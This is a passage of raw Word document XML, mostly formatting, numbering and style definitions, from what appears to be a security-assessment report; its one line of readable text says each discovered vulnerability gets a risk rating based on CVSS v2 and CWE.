        </w:rPr>
        <w:t>Final</w:t>
      </w:r>
      <w:r w:rsidR="009D4FEF" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> report. A risk rating is assigned to each discovered vulnerabilities based on CVSS v2 and</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0029303A" w:rsidRPr="00802CE3" w:rsidRDefault="009D4FEF" w:rsidP="009D4FEF">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="9760"/>
        </w:tabs>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>CWE.</w:t>
      </w:r>
      <w:r w:rsidR="000122C4" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251659776" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="099D7857" wp14:editId="791E65F0">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>6361430</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="page">
              <wp:posOffset>457200</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="13970" cy="179070"/>
            <wp:effectExtent l="0" t="0" r="508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70" cy="179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8" w:name="page26"/>
      <w:bookmarkEnd w:id="8"/>
    </w:p>
    <w:sectPr w:rsidR="0029303A" w:rsidRPr="00802CE3" w:rsidSect="009D4FEF">
      <w:pgSz w:w="12240" w:h="15840"/>
      <w:pgMar w:top="739" w:right="360" w:bottom="0" w:left="360" w:header="720" w:footer="720" w:gutter="0"/>
      <w:cols w:space="720"/>
      <w:docGrid w:linePitch="24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0C9D" w:rsidRDefault="00F40C9D" w:rsidP="006C7366">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="00F40C9D" w:rsidRDefault="00F40C9D" w:rsidP="006C73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0C9D" w:rsidRDefault="00F40C9D" w:rsidP="006C7366">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="00F40C9D" w:rsidRDefault="00F40C9D" w:rsidP="006C736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Num9"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%2"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="1080" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%2.%3"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%2.%3.%4"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="1800" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="4">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%2.%3.%4.%5"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="5">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%2.%3.%4.%5.%6"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="2520" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="6">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%2.%3.%4.%5.%6.%7"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="7">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%2.%3.%4.%5.%6.%7.%8"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="3240" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="8">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%2.%3.%4.%5.%6.%7.%8.%9"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="1">
    <w:nsid w:val="00000002"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="00000002"/>
    <w:name w:val="WWNum10"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="1080" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%2.%3"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%2.%3.%4"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="1800" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="4">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%2.%3.%4.%5"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="5">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%2.%3.%4.%5.%6"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="2520" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="6">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%2.%3.%4.%5.%6.%7"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="7">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%2.%3.%4.%5.%6.%7.%8"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="3240" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="8">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%2.%3.%4.%5.%6.%7.%8.%9"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="2">
    <w:nsid w:val="00000003"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="00000003"/>
    <w:name w:val="WWNum11"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="-"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="OpenSymbol" w:hAnsi="OpenSymbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%2"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="1080" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%2.%3"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%2.%3.%4"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="1800" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="4">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%2.%3.%4.%5"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="5">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%2.%3.%4.%5.%6"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="2520" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="6">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%2.%3.%4.%5.%6.%7"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="7">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%2.%3.%4.%5.%6.%7.%8"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="3240" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="8">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%2.%3.%4.%5.%6.%7.%8.%9"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="3">
    <w:nsid w:val="00000004"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="00000004"/>
    <w:name w:val="WWNum14"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="1080" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="1800" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="2520" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>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rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="4">
    <w:nsid w:val="00000005"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0000000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06C85E44"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="8E56E8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E0A42FE"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A57AA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1F1461"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="8E56E8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F4F206C"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="2098DF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4097C9B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="580893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3538615B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="447E0D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E5B3509"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="8E56E8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51B7152C"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="27843E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4131A86"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="4DD43A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56250126"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="8E56E8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AAA6346"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="8E56E8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CC341F8"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2FE61B5E"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="1080" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="1800" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="2520" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>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rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="17">
    <w:nsid w:val="6FB95EC6"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2FE61B5E"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="-720"/>
        </w:tabs>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="-720"/>
        </w:tabs>
        <w:ind w:left="1080" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="-720"/>
        </w:tabs>
        <w:ind w:left="1800" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="-720"/>
        </w:tabs>
        <w:ind w:left="2520" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="-720"/>
        </w:tabs>
        <w:ind w:left="3240" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="-720"/>
        </w:tabs>
        <w:ind w:left="3960" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="-720"/>
        </w:tabs>
        <w:ind w:left="4680" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="-720"/>
        </w:tabs>
        <w:ind w:left="5400" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="-720"/>
        </w:tabs>
        <w:ind w:left="6120" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="18">
    <w:nsid w:val="71BC176A"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="84CE56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75AD5093"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="84CE56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EB7777D"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="8E56E8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7EF5412A"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="84CE56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16"/>
  </w:num>
  <w:num w:numId="7">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="8">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="9">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="10">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="11">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="12">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="13">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="14">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="15">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="16">
    <w:abstractNumId w:val="19"/>
  </w:num>
  <w:num w:numId="17">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="18">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="19">
    <w:abstractNumId w:val="21"/>
  </w:num>
  <w:num w:numId="20">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="21">
    <w:abstractNumId w:val="12"/>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026"/>
    <w:rsid w:val="0000646A"/>
    <w:rsid w:val="000122C4"/>
    <w:rsid w:val="0004341D"/>
    <w:rsid w:val="0004468C"/>
    <w:rsid w:val="00065360"/>
    <w:rsid w:val="000A5EB8"/>
    <w:rsid w:val="000C13B7"/>
    <w:rsid w:val="000E6466"/>
    <w:rsid w:val="001467CB"/>
    <w:rsid w:val="00151064"/>
    <w:rsid w:val="001A3525"/>
    <w:rsid w:val="001B5937"/>
    <w:rsid w:val="001C1092"/>
    <w:rsid w:val="001C152F"/>
    <w:rsid w:val="001C40ED"/>
    <w:rsid w:val="00222FD2"/>
    <w:rsid w:val="002267FB"/>
    <w:rsid w:val="00281115"/>
    <w:rsid w:val="00287724"/>
    <w:rsid w:val="0029303A"/>
    <w:rsid w:val="002A6DE1"/>
    <w:rsid w:val="002D1253"/>
    <w:rsid w:val="00395095"/>
    <w:rsid w:val="00395623"/>
    <w:rsid w:val="003978E5"/>
    <w:rsid w:val="003B1A2B"/>
    <w:rsid w:val="003D2007"/>
    <w:rsid w:val="003E5300"/>
    <w:rsid w:val="003F5DE5"/>
    <w:rsid w:val="0041513E"/>
    <w:rsid w:val="00426336"/>
    <w:rsid w:val="0045639A"/>
    <w:rsid w:val="00461E7F"/>
    <w:rsid w:val="004819BF"/>
    <w:rsid w:val="00494827"/>
    <w:rsid w:val="004E7688"/>
    <w:rsid w:val="00537422"/>
    <w:rsid w:val="005412E0"/>
    <w:rsid w:val="005453D1"/>
    <w:rsid w:val="00552F9D"/>
    <w:rsid w:val="005C4026"/>
    <w:rsid w:val="005D5CF4"/>
    <w:rsid w:val="005D7D56"/>
    <w:rsid w:val="005F0D98"/>
    <w:rsid w:val="00601C08"/>
    <w:rsid w:val="0060276E"/>
    <w:rsid w:val="0062005A"/>
    <w:rsid w:val="006526E9"/>
    <w:rsid w:val="00653916"/>
    <w:rsid w:val="0066209C"/>
    <w:rsid w:val="006935E2"/>
    <w:rsid w:val="00695917"/>
    <w:rsid w:val="006B68E0"/>
    <w:rsid w:val="006C474E"/>
    <w:rsid w:val="006C7366"/>
    <w:rsid w:val="006F09D7"/>
    <w:rsid w:val="00714F55"/>
    <w:rsid w:val="00747D26"/>
    <w:rsid w:val="0076649E"/>
    <w:rsid w:val="00790D65"/>
    <w:rsid w:val="00800601"/>
    <w:rsid w:val="00802CE3"/>
    <w:rsid w:val="008B1C7F"/>
    <w:rsid w:val="008F4BDF"/>
    <w:rsid w:val="0092093C"/>
    <w:rsid w:val="00942FF3"/>
    <w:rsid w:val="00953B86"/>
    <w:rsid w:val="0099054A"/>
    <w:rsid w:val="009933A3"/>
    <w:rsid w:val="009A0937"/>
    <w:rsid w:val="009B6618"/>
    <w:rsid w:val="009D4FEF"/>
    <w:rsid w:val="009D61EB"/>
    <w:rsid w:val="009F5B1D"/>
    <w:rsid w:val="00A2045E"/>
    <w:rsid w:val="00A81704"/>
    <w:rsid w:val="00A86587"/>
    <w:rsid w:val="00A92E22"/>
    <w:rsid w:val="00AA1885"/>
    <w:rsid w:val="00AB2226"/>
    <w:rsid w:val="00B318AA"/>
    <w:rsid w:val="00B87B72"/>
    <w:rsid w:val="00BC0234"/>
    <w:rsid w:val="00BF38E1"/>
    <w:rsid w:val="00C05D34"/>
    <w:rsid w:val="00C21536"/>
    <w:rsid w:val="00C31FE7"/>
    <w:rsid w:val="00C37495"/>
    <w:rsid w:val="00CB6B33"/>
    <w:rsid w:val="00D003DD"/>
    <w:rsid w:val="00D43C03"/>
    <w:rsid w:val="00D904AA"/>
    <w:rsid w:val="00D9541D"/>
    <w:rsid w:val="00DD6E60"/>
    <w:rsid w:val="00DF1044"/>
    <w:rsid w:val="00E433E3"/>
    <w:rsid w:val="00E92E66"/>
    <w:rsid w:val="00E96BAE"/>
    <w:rsid w:val="00EC009A"/>
    <w:rsid w:val="00EF0F02"/>
    <w:rsid w:val="00EF28DB"/>
    <w:rsid w:val="00F018C8"/>
    <w:rsid w:val="00F05D85"/>
    <w:rsid w:val="00F2563F"/>
    <w:rsid w:val="00F40C9D"/>
    <w:rsid w:val="00F50E3E"/>
    <w:rsid w:val="00F6072A"/>
    <w:rsid w:val="00F62870"/>
    <w:rsid w:val="00F76C6D"/>
    <w:rsid w:val="00F85E97"/>
    <w:rsid w:val="00F8662B"/>
    <w:rsid w:val="00FA0CEB"/>
    <w:rsid w:val="00FA39A8"/>
    <w:rsid w:val="00FB1D3F"/>
    <w:rsid w:val="00FB304F"/>
    <w:rsid w:val="00FE204E"/>
    <w:rsid w:val="00FF2F44"/>
    <w:rsid w:val="00FF59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chartTrackingRefBased/>
  <w15:docId w15:val="{AA624B62-ADFD-47A8-9347-5364E3FD3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474E"/>
    <w:pPr>
      <w:suppressAutoHyphens/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="SimSun"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
      <w:lang w:eastAsia="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ListLabel1">
    <w:name w:val="ListLabel 1"/>
    <w:rPr>
      <w:rFonts w:cs="Courier New"/>
    </w:rPr>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Header">
    <w:name w:val="header"/>
    <w:basedOn w:val="Normal"/>
    <w:pPr>
      <w:suppressLineNumbers/>
      <w:tabs>
        <w:tab w:val="center" w:pos="4513"/>
        <w:tab w:val="right" w:pos="9026"/>
      </w:tabs>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Footer">
    <w:name w:val="footer"/>
    <w:basedOn w:val="Normal"/>
    <w:pPr>
      <w:suppressLineNumbers/>
      <w:tabs>
        <w:tab w:val="center" w:pos="4513"/>
        <w:tab w:val="right" w:pos="9026"/>
      </w:tabs>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListParagraph">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="Normal"/>
    <w:qFormat/>
    <w:pPr>
